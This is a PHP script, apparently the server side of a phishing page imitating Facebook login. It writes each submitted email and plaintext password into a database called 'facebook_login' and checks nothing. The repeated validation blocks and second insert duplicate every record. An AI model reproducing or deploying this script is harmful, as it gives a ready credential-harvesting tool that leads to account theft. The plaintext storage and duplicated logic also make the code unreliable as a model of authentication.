<?php
// Conexión a la base de datos
$servername = "localhost";
$username = "root"; // Cambiar según tu configuración
$password = ""; // Cambiar según tu configuración
$dbname = "facebook_login";

// Crear la conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

// Obtener los datos enviados desde el formulario
$email = $_POST['email'];
$password = $_POST['password'];
$login_time = date('Y-m-d H:i:s'); // Hora actual

// Validar campos vacíos
if (empty($email) || empty($password)) {
    echo "error";
    exit;
}

// Insertar datos en la base de datos
$sql = "INSERT INTO users (email, password, login_time) VALUES (?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sss", $email, $password, $login_time);

if ($stmt->execute()) {
    echo "success"; // Respuesta en caso de éxito
} else {
    echo "error"; // Respuesta en caso de error
}


if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

if (empty($email) || empty($password)) {
    echo "Error: campos vacíos.";
    exit;
}

if ($stmt->execute()) {
    echo "success";
} else {
    echo "Error al insertar los datos: " . $stmt->error; // Depuración
}

$stmt->close();
$conn->close();

?>